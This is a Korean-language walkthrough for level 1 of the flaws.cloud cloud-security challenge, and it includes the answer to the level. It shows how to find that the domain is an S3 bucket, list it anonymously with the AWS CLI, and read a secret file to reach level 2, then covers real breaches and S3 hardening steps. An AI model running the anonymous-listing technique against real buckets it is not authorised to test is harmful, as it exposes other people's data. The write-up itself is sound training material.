# Level 1 — S3 버킷 공개 리스팅

> **URL**: http://flaws.cloud/<br>
> **핵심 기술**: S3 / DNS / 익명 AWS API<br>
> **난이도**: ⭐ (가장 쉬움)<br>
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

`flaws.cloud` 를 들어가면 공식 사이트의 **1 번 문제** 가 나온다. 여기서 얻어야 할 것은 **다음 단계의 서브도메인 URL** 이다. 사이트에 쓰인 대로 "문제 자체가 그대로 정답의 단서" 이며, 오래된 S3 공개 버킷의 기본 동작을 체험하는 레벨이다.

## 🧭 공식 힌트 (사이트 원문 의역)

공식 페이지는 힌트를 **네 번 접었다 펼치는** 구조이다.

<details>
<summary><b>Hint 1</b> — 아주 가벼운 암시</summary>

> 이 사이트가 어디에서 호스팅되는지 찾아보세요. 이 URL 의 DNS 를 살펴보면 무언가 실마리가 나올 것입니다.

</details>

<details>
<summary><b>Hint 2</b> — 필요한 서비스</summary>

> Amazon S3 에 대해 공부해 보세요. 사이트가 S3 에 있다는 사실과, S3 버킷은 이름으로 주소를 지정한다는 사실을 기억하세요.

</details>

<details>
<summary><b>Hint 3</b> — 거의 풀이</summary>

> 버킷이 공개적으로 나열 가능하면, AWS CLI 로 내용을 볼 수 있습니다. `aws s3 ls` 명령어를 `--no-sign-request` 옵션과 함께 사용해 보세요.

</details>

## 📚 사전 지식

- S3 버킷 이름은 **DNS 이름** 이다. `flaws.cloud` 도메인이 곧 동일한 이름의 S3 버킷을 가리킨다.
- S3 는 **정적 웹사이트 호스팅** 기능을 지원한다. 이 경우 `http://<bucket>.s3.amazonaws.com/` 또는 `http://<bucket>.s3-website-<region>.amazonaws.com/` 으로 접근 가능하다.
- `--no-sign-request` 는 "내 AWS 자격증명으로 서명하지 말고 익명으로 호출" 하라는 옵션이다. 공개 버킷을 조사할 때 사용.
- 자세한 개념은 [AWS 보안 primer §2](../docs/aws-security-primer.md#2-s3--버킷객체aclpolicyblock-public-access) 참고.

## 🔍 정찰

### 1단계. 도메인이 어디로 향하는지 확인

```bash
dig flaws.cloud +short
# 출력 예 (A 레코드만 반환되어 S3 IP 풀이 보임):
# 52.92.235.43
# 3.5.80.237
# ...
```

> 💡 예전에는 `dig` 가 `s3-website-us-west-2.amazonaws.com.` CNAME 을 함께 보여줬지만, 2024 년 이후 AWS DNS 가 A 레코드만 리턴하도록 바뀌었다. 대신 **버킷 경로로 직접 HEAD 요청**을 보내면 한 줄로 판명된다.

### 2단계. 버킷 경로로 리전 확인 (정설 방법)

```bash
curl -sI http://flaws.cloud.s3.amazonaws.com/ | grep -i region
# x-amz-bucket-region: us-west-2
```

이 한 줄로 **도메인이 S3 버킷**이며 **리전이 `us-west-2`** 임을 확정한다.

> ⚠️ `curl -sI http://flaws.cloud/` 는 S3 **웹사이트 호스팅** 엔드포인트를 거치므로 `x-amz-bucket-region` 헤더가 보이지 않는다. 버킷 네이티브 엔드포인트(`...s3.amazonaws.com`)를 써야 한다.

## 🧨 취약점 원리

S3 버킷의 **ACL(Access Control List)** 중 레거시 그룹 `AllUsers` 에 `READ` 권한을 주면, 인증되지 않은 사용자가 `ListBucket` API 를 호출하여 버킷 안 **모든 객체의 키 이름** 을 볼 수 있다. 정적 웹사이트로 서비스되는 버킷에서 흔히 발생하는 실수다.

- 기본 웹사이트(`index.html`) 외 **다른 파일도 모두 버킷에 존재**
- 객체를 **읽기** 권한(`s3:GetObject`)까지 공개했다면 그 내용까지 꺼낼 수 있음
- 2018 년 도입된 **Block Public Access (BPA)** 로 현재는 기본적으로 차단되지만, 이전에 만든 버킷은 여전히 열려 있을 수 있음

## 🛠 풀이 (Step by Step)

### 1. AWS CLI 로 익명 리스팅

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

예상 출력:
```
2017-03-14 12:00:38       2575 hint1.html
2017-03-03 13:05:17       1707 hint2.html
2017-03-03 13:05:11       1101 hint3.html
2024-02-22 11:32:41       2861 index.html
2018-07-11 01:47:16      15979 logo.png
2017-02-27 10:59:28         46 robots.txt
2017-02-27 10:59:30       1051 secret-dd02c7c.html
```

**눈에 띄는 파일**: `secret-dd02c7c.html` — 파일명이 이미 "비밀" 이라고 스스로 말하고 있다.

### 2. 비밀 파일 열어보기

```bash
curl -s http://flaws.cloud/secret-dd02c7c.html | grep -Eo 'http[s]?://[^"]+flaws.cloud[^"]*' | head -1
```

또는 그냥 브라우저로 `http://flaws.cloud/secret-dd02c7c.html` 접속.

페이지 본문 예:
```html
Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">...</a>
```

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 다음 레벨: **http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/**
- 교훈: 버킷을 **웹 호스팅용으로 공개**해도 좋지만, `ListBucket` 까지 공개할 필요는 없다. 디렉터리 인덱싱을 끄고 객체 단위로만 공개하라.

</details>

## 🌍 실제 세계 사례

- 2017 년 **Accenture** — 외부 공개 S3 버킷에 내부 자격증명·비밀키 수천 건 노출. 버킷 이름만 추측하면 누구나 리스팅 가능했다 ([UpGuard 보고서](https://www.upguard.com/breaches/cloud-leak-accenture)).
- 2017 년 **Verizon / NICE Systems** — 파트너 벤더 S3 버킷 공개로 1,400만 명 통화 기록 유출.
- S3 공개 버킷 사고는 지금도 매년 수백 건 발견된다. flaws.cloud L1 의 시나리오와 **정확히 동일**한 구조.

## 🛡 방어 대책

### ① 계정 레벨 Block Public Access 활성화 (가장 중요)
```bash
aws s3control put-public-access-block \
  --account-id <YOUR_ACCOUNT_ID> \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### ② 버킷 레벨 Block Public Access
```bash
aws s3api put-public-access-block \
  --bucket mybucket \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### ③ 정적 웹 호스팅만 허용하는 버킷 정책 (리스팅 제외)
`s3:GetObject` 는 허용하되 `s3:ListBucket` 은 부여하지 않는다. 아래 정책은 **공개 읽기만** 준다:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::mybucket/*"
    }
  ]
}
```
`s3:ListBucket` 을 넣지 않았으므로 `aws s3 ls s3://mybucket --no-sign-request` 는 **AccessDenied** 가 된다.

### ④ AWS Config 규칙으로 상시 감시
- `s3-bucket-public-read-prohibited`
- `s3-bucket-public-write-prohibited`
- `s3-account-level-public-access-blocks`

### ⑤ 버킷 네이밍 난독화
`flaws.cloud` 처럼 도메인 = 버킷 이름이면 추측 공격에 취약. 내부 시스템 버킷에는 추측하기 어려운 접두사를 붙이는 것이 보조 방어가 된다(보조일 뿐, 주방어는 ①~③).

## ✅ 체크리스트

- [ ] `aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2` 로 파일 목록 획득 재현
- [ ] `curl -sI http://flaws.cloud.s3.amazonaws.com/` 로 `x-amz-bucket-region: us-west-2` 확인
- [ ] `secret-dd02c7c.html` 에서 다음 레벨 URL 확인
- [ ] 본인 AWS 계정에서 테스트 버킷을 만들고 `--no-sign-request` 로 리스팅 시도 → BPA 로 차단되는 것 확인
- [ ] 위 버킷 정책 JSON 을 적용해 "GetObject 는 되지만 ListBucket 은 실패" 상태 재현

## ⏭ 다음

[Level 2 →](level-02.md)
